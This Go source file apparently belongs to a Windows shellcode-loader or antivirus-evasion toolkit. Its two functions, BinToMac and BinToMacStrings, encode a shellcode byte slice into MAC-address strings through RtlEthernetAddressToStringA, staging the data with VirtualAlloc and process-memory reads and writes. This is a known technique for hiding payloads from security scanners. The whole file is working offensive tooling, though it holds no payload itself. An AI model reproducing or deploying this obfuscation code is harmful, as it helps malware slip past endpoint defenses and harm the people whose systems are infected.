package crypto

import (
	"strings"
	"unsafe"
	"variant/log"
	"variant/wdll"

	"golang.org/x/sys/windows"
)

func BinToMac(shellcode []byte) string {
	mac, _ := windows.VirtualAlloc(
		0,
		uintptr(len(shellcode)/6*17),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE)

	for i := 0; i < len(shellcode)/6; i++ {
		var macAddress [17]byte
		ret, _, _ := wdll.RtlEthernetAddressToStringA().Call(uintptr(unsafe.Pointer(&shellcode[i*6])), uintptr(unsafe.Pointer(&macAddress[0])), 0)
		if ret == 0 {
			log.Fatal("error calling RtlEthernetAddressToStringA")
		}

		err := windows.WriteProcessMemory(windows.CurrentProcess(), mac+uintptr(i*17), &macAddress[0], 17, nil)
		if err != nil {
			log.Fatalf("WriteProcessMemory() err: %v", err)
		}
	}

	var l []string
	for i := 0; i < len(shellcode)/6; i++ {
		var macAddress [17]byte
		err := windows.ReadProcessMemory(windows.CurrentProcess(), mac+uintptr(i*17), &macAddress[0], 17, nil)
		if err != nil {
			log.Fatalf("ReadProcessMemory() err: %v", err)
		}

		l = append(l, string(macAddress[:]))
	}

	var formattedResult strings.Builder

	for i, item := range l {
		formattedResult.WriteString(`"`)
		formattedResult.WriteString(item)
		formattedResult.WriteString(`"`)

		// 添加逗号分隔符，除非是最后一个元素
		if i != len(l)-1 {
			formattedResult.WriteString(",")
		}
	}

	return formattedResult.String()
}

func BinToMacStrings(shellcode []byte) []string {
	mac, _ := windows.VirtualAlloc(
		0,
		uintptr(len(shellcode)/6*17),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE)

	for i := 0; i < len(shellcode)/6; i++ {
		var macAddress [17]byte
		ret, _, _ := wdll.RtlEthernetAddressToStringA().Call(uintptr(unsafe.Pointer(&shellcode[i*6])), uintptr(unsafe.Pointer(&macAddress[0])), 0)
		if ret == 0 {
			log.Fatal("error calling RtlEthernetAddressToStringA")
		}

		err := windows.WriteProcessMemory(windows.CurrentProcess(), mac+uintptr(i*17), &macAddress[0], 17, nil)
		if err != nil {
			log.Fatalf("WriteProcessMemory() err: %v", err)
		}
	}

	var l []string
	for i := 0; i < len(shellcode)/6; i++ {
		var macAddress [17]byte
		err := windows.ReadProcessMemory(windows.CurrentProcess(), mac+uintptr(i*17), &macAddress[0], 17, nil)
		if err != nil {
			log.Fatalf("ReadProcessMemory() err: %v", err)
		}

		l = append(l, string(macAddress[:]))
	}

	return l
}
